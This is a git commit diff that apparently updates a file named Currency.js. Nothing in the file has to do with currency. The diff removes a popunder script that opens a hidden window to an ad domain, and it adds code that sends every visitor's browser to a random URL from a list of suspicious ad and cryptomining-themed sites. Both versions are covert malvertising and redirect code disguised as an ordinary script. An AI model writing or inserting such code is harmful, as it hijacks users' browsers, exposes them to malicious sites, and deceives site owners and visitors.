99e890cdd05dc1d6379b0666d70796a201a0f360
itsmeplayfj <94605694+itsmeplayfj@users.noreply.github.com>
2022-06-29 11:02:01 -0700

    Update Currency.js

--- Currency.js
+++ Currency.js
@@ -1,45 +1,13 @@
-var popunder="//anomalousporch.com/s12ygwr4j?key=0c236aab12a231150e5db3f8b366197c"
-
-//specify popunder window features
-var winfeatures="width=800,height=510,scrollbars=1,resizable=1,toolbar=1,location=1,menubar=1,status=1,directories=0"
-
-//Pop-under only once per browser session? (0=no, 1=yes)
-
-var once_per_session=0
-
-
-function get_cookie(Name) {
-  var search = Name + "="
-  var returnvalue = "";
-  if (document.cookie.length > 0) {
-    offset = document.cookie.indexOf(search)
-    if (offset != -1) { // if cookie exists
-      offset += search.length
-      // set index of beginning of value
-      end = document.cookie.indexOf(";", offset);
-      // set index of end of cookie value
-      if (end == -1)
-         end = document.cookie.length;
-      returnvalue=unescape(document.cookie.substring(offset, end))
-      }
-   }
-  return returnvalue;
-}
-
-function loadornot(){
-if (get_cookie('popunder')==''){
-loadpopunder()
-document.cookie="popunder=yes"
-}
-}
-
-function loadpopunder(){
-win2=window.open(popunder,"",winfeatures)
-win2.blur()
-window.focus()
-}
-
-if (once_per_session==0)
-loadpopunder()
-else
-loadornot()
+var dataUrl = [
+'https://wavermerchandiseweird.com/rmdh7vzvs?key=ed9adfc3b8491179ad53c3e027d8b8a9',
+'//cryptominingdoge.blogspot.com/',
+'//cryptominingfilm.blogspot.com/',
+'//wavermerchandiseweird.com/tuf9tdkp?key=6729f99d594d33885cec1eb3981e92ac',
+'//wavermerchandiseweird.com/idt1y6nan?key=ce537f67a6c57e27e292db0da8179851',
+'//wavermerchandiseweird.com/qqqysyvbg?key=1d3303b4d7decb61514e9d25a740edfe',
+'//wavermerchandiseweird.com/z0sfd1pts?key=2431d39c120107799ee55bcab97fc536',
+'//wavermerchandiseweird.com/tuf9tdkp?key=6729f99d594d33885cec1eb3981e92ac',
+'//wavermerchandiseweird.com/idt1y6nan?key=ce537f67a6c57e27e292db0da8179851'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
